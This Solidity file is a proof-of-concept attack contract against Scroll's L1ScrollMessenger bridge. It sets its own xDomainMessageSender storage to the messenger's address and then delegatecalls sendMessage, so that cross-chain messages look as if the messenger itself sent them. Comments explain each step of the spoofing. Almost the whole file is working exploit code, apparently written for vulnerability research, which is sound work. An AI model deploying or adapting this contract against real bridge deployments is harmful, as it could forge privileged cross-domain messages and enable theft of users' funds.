// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {ScrollMessengerBase} from "../../libraries/ScrollMessengerBase.sol";
import {ScrollConstants} from "../../libraries/constants/ScrollConstants.sol";

// Note: ScrollMessengerBase is OwnableUpgradeable, PausableUpgradeable, ReentrancyGuardUpgradeable
// We need to initialize these as well.

contract DelegateAttackContract is ScrollMessengerBase {
    constructor(address _counterpartL1SM, address _feeVaultL1SM) ScrollMessengerBase(_counterpartL1SM) {
        // Initialize inherited contracts
        // OwnableUpgradeable.__Ownable_init_unchained(); // Not strictly needed for PoC if owner functions aren't hit
        // PausableUpgradeable.__Pausable_init_unchained(); // Not strictly needed for PoC if pause functions aren't hit
        // ReentrancyGuardUpgradeable.__ReentrancyGuard_init_unchained(); // Not strictly needed for PoC
        
        // Call the base initializer for ScrollMessengerBase
        // Parameters for __ScrollMessengerBase_init: (address _owner, address _feeVault)
        // The first param to __ScrollMessengerBase_init is for OwnableUpgradeable's owner.
        // For PoC, can set to address(this) or a known EOA if needed.
        // Let's use address(this) for simplicity, though it's not directly used in the exploit flow.
        __ScrollMessengerBase_init(address(this), _feeVaultL1SM);
        
        // Ensure owner is set if any Ownable functions in the base were to be called by the logic.
        // For sendMessage, it's not owner-protected.
    }

    function triggerDelegateCallAttack(
        address _l1ScrollMessenger, // This is the actual L1ScrollMessenger address we are making a delegatecall TO
        address _targetL2,
        uint256 _valueL2,
        bytes memory _messageL2,
        uint256 _gasLimitL2,
        address _refundAddress 
    ) external payable {
        // --- CRITICAL STEP FOR SPOOFING ---
        // Store the original xDomainMessageSender to restore it later (good practice, though not strictly needed for PoC)
        address originalXDomainSender = xDomainMessageSender;

        // Set our own xDomainMessageSender storage slot (inherited from ScrollMessengerBase)
        // to be the L1ScrollMessenger's address.
        xDomainMessageSender = _l1ScrollMessenger; 

        // Now, when L1ScrollMessenger.sendMessage is called via DELEGATECALL:
        // - It executes in the context of this contract (DelegateAttackContract).
        // - When it reads its own state variable `xDomainMessageSender` (or calls the public getter `xDomainMessageSender()`),
        //   it will read from DelegateAttackContract's storage slot for `xDomainMessageSender`.
        // - This means the `_from` address encoded in the `xDomainCalldata` by `_encodeXDomainCalldata`
        //   will be `_l1ScrollMessenger` (i.e., address(l1ScrollMessengerContract)).
        
        (bool success, bytes memory returnData) = _l1ScrollMessenger.delegatecall(
            abi.encodeWithSignature(
                // Ensure the signature matches L1ScrollMessenger.sendMessage exactly
                "sendMessage(address,uint256,bytes,uint256,address)", 
                _targetL2,
                _valueL2,
                _messageL2,
                _gasLimitL2,
                _refundAddress
            )
        );

        // Restore the original xDomainMessageSender
        xDomainMessageSender = originalXDomainSender;

        require(success, string(returnData)); // Revert with error if delegatecall failed
    }

    // Fallback to receive ETH if needed (e.g. if _valueL2 in sendMessage was non-zero and came from this contract's balance)
    receive() external payable {}
}
